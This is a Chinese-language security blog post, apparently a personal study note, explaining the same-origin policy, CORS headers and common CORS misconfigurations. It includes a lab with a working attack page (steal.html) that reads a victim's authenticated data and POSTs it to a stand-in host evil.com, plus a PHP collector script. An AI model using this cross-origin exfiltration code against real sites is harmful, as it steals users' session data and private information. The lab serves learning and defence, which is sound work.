@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>CORS跨域漏洞的学习 | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">CORS跨域漏洞的学习</h2>
+            <div class="post-date">2020-01-22</div>
+            
+            <div class="post-content">
+              <p>讲跨域漏洞前。首先得讲一下浏览器的同源策略<br>
+<strong>SOP，同源策略 (Same Origin Policy)</strong><br>
+同源策略是浏览器的一个安全功能。不同源的客户端脚本(JS)在没有被授权的情况下。不能读取对方资源。<br>
+同源的定义是。协议/端口/主机</p>
+<!-- more -->
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1579692178739.png" alt="" loading="lazy"></figure>
+<pre><code>假设www.test.com需要通过js去www.abc.com加载一张图片。在没有同源策略时。是没问题的。但是
+如果存在同源策略。test.com和abc.com不同域名。那么就会被禁止读取。那这让一些从网上加载资源的web就很难受。
+</code></pre>
+<p><strong>不受同源策略限制的</strong></p>
+<pre><code>1. 页面中的链接，重定向以及表单提交是不会受到同源策略限制的。
+2. 跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;，&lt;img&gt;，&lt;link&gt;，&lt;iframe&gt;等。
+</code></pre>
+<p><strong>CORS，跨域资源共享（Cross-origin resource sharing）</strong><br>
+是H5提供的一种机制。Web应用程序可以通过HTTP增加字段。来告诉浏览器。哪些不同来源的服务器是可以访问本站资源的。当不同域请求时。就出现了跨域资源共享<br>
+1：跨域访问的一些场景</p>
+<pre><code>后端开发完部分代码。提供接口给前端。前后分离的情况下。域名不同。需要跨域访问
+程序员在本地开发。本地的文件夹。并不是在一个域下。当js发送ajax请求。请求另外的页面时。就会跨域
+电商网站通过浏览器加载第三方快递物流信息
+子域名希望调用主域名的用户资料接口。显示数据
+</code></pre>
+<p><strong>CORS关键头部</strong><br>
+<code>Access-Control-Allow-Origin</code><br>
+指定哪些域可以访问当前域名。比如test.com想访问abc.com的资源。那么就要在abc.com服务器上设置Access-Control-Allow-Origin:test.com<br>
+即允许test.com访问<br>
+<code>Access-Control-Allow-Credentials</code><br>
+指定浏览器在请求时。是否可以携带cookie，可以就为True<br>
+<code>Access-Control-Allow-Methods</code><br>
+指定可以使用哪些方法(GET,POST)访问资源<br>
+<strong>常见的攻击场景</strong><br>
+<code>CORS错误配置</code><br>
+假设。我们是test.com向abc.com发送了请求。abc.com返回</p>
+<pre><code>HTTP/1.0 200 OK
+Access-Control-Allow-Origin: *
+#*说明任何域都可以访问资源
+Access-Control-Allow-Credentials: true
+#允许携带cookie
+</code></pre>
+<p>那么这就是个错误配置。并没有起到安全保护作用<br>
+<code>错误匹配不完整域名</code><br>
+继续请求。假设服务器返回如下</p>
+<pre><code>HTTP/1.0 200 OK
+Access-Control-Allow-Origin: requester.com
+Access-Control-Allow-Credentials: true
+</code></pre>
+<p>允许requester.com。但是没有写完整。让我们以下请求即可绕过</p>
+<pre><code>GET /api/userinfo.php
+Host: example.com
+Connection: close
+Origin: attackerrequester.com
+#存在requester.com
+</code></pre>
+<p>出现这种情况。都是后端在验证策略上采用了*requester.com来匹配<br>
+下面来说下CORS漏洞攻击流程。<br>
+假设用于登陆了一个有CORS的网站。同时又访问了攻击者的链接eval.com。<br>
+evil.com向vuln.com发起请求。获取敏感数据。浏览器能否接收消息。取决于vuln.com的配置。如果配置得当。不同域就不能获得数据<br>
+<strong>实验</strong><br>
+www.vuln.com<br>
+#web服务器<br>
+www.evil.com<br>
+#黑客服务器<br>
+当cookie设置为httponly属性后。没办法被js读取。但是phpinfo是有纪录的。我们就假设phpinfo是敏感信息。模拟登陆set-cookie后。访问敏感信息界面<br>
+www.vuln.com/login.php</p>
+<pre><code>&lt;?php
+//假设此页面需要登录后才能访问
+setcookie(&quot;SESSIONid&quot;,&quot;THISISSESSID20180802&quot;,time()+3600,&quot;&quot;,&quot;&quot;,0);  //设置普通Cookie
+setcookie(&quot;test_http&quot;,&quot;THISISSESSIDhttponly20180802&quot;,time()+3600,&quot;&quot;,&quot;&quot;,0,1);//设置HttpOnly Cookie
+?&gt;
+</code></pre>
+<p>www.vuln.com/secrect.php</p>
+<pre><code>&lt;? php
+//header(&quot;Access-Control-Allow-Origin:http://www.evil.com&quot;);
+//header(&quot;Access-Control-Allow-Credentials:true&quot;);
+phpinfo();
+#敏感信息
+?&gt;
+</code></pre>
+<p>先访问login.php。然后访问secrect.php。假设cookie是敏感信息<br>
+<img src="https://guokeya.github.io/post-images/1579693584130.png" alt="" loading="lazy"><br>
+此时黑客给了个恶意链接。用户访问<br>
+www.evil.com/steal.html</p>
+<pre><code>&lt;!DOCTYPE&gt;
+&lt;html&gt;
+&lt;h1&gt;Hello I evil page. &lt;/h1&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+function loadXMLDoc()
+{
+    var xhr1;
+    var xhr2;
+    if(window.XMLHttpRequest)
+    {
+        xhr1 = new XMLHttpRequest();
+        xhr2 = new XMLHttpRequest();
+        #新版本
+    }
+    else
+    {
+        xhr1 = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+        xhr2= new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+        #旧版本。主要是为了兼容
+    }
+    xhr1.onreadystatechange=function()
+    #判断xhr1有没有请求。当返回变化时。就会调用function
+    {
+        if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) //if receive xhr1 response
+        {
+            var datas=xhr1.responseText;
+            #用户带着cookie请求的敏感信息
+            xhr2.open(&quot;POST&quot;,&quot;http://www.evil.com/save.php&quot;,&quot;true&quot;);
+            #保存本地
+            xhr2.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+            xhr2.send(&quot;T1=&quot;+escape(datas));      
+        }
+    }
+    xhr1.open(&quot;GET&quot;,&quot;http://www.vuln.com/secrect.php&quot;,&quot;true&quot;) //request user page.
+    xhr1.withCredentials = true;        //request with cookie
+    xhr1.send();
+    #请求完毕。onreadystatechange变化。调用上面的function
+}
+loadXMLDoc();
+&lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<p>www.evil.com/save.php</p>
+<pre><code>&lt;?php
+$myfile = fopen(&quot;secrect.html&quot;, &quot;w+&quot;) or die(&quot;Unable to open file!&quot;);
+$txt = $_POST['T1'];
+fwrite($myfile, $txt);
+fclose($myfile);
+?&gt;
+</code></pre>
+<p>由于用户访问了恶意链接。触发js脚本。js脚本请求了www.vuln的资源。浏览器自动为我们添加origin这个字段。用来说明我们是哪来的<br>
+<img src="https://guokeya.github.io/post-images/1579694158002.png" alt="" loading="lazy"><br>
+js脚本出现一个错误<br>
+<img src="https://guokeya.github.io/post-images/1579694926855.png" alt="" loading="lazy"><br>
+服务端缺少access-control-allow-origin头。所以浏览器就拦截了该请求<br>
+现在取消www.vuln.com/secrect.php的注释。允许www.evil.com访问<br>
+<img src="https://guokeya.github.io/post-images/1579694352498.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579694407935.png" alt="" loading="lazy"><br>
+黑客收到了带有httponly的敏感信息<br>
+<img src="https://guokeya.github.io/post-images/1579694458736.png" alt="" loading="lazy"><br>
+<strong>XSS请求跨域</strong><br>
+假设我们我们主域名provider.com存在CORS。但是只允许requester.com的子域访问</p>
+<pre><code>if ($_SERVER['HTTP_HOST'] == '*.requester.com')
+ {
+  //Access data
+  else{ // unauthorized access}
+}
+</code></pre>
+<p>假设我们可以访问sub.requester.com但无法访问requester.com<br>
+并且sub.requester.com存在XSS。那么我们就可以通过CORS去请求provider.com的信息<br>
+原理同上<br>
+参考文章：<br>
+<code>https://www.freebuf.com/column/194652.html</code><br>
+<code>https://www.secshi.com/20298.html</code></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/Web/" class="tag">
+                    Web安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/swpuctf2019easy-pythonflask-session-wei-zao-ruan-lian-jie-ming-ling-zhi-xing-bypass/">
+                  <h3 class="post-title">
+                    [SWPUCTF2019]Easy Python(flask session伪造+软链接+命令执行bypass)
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
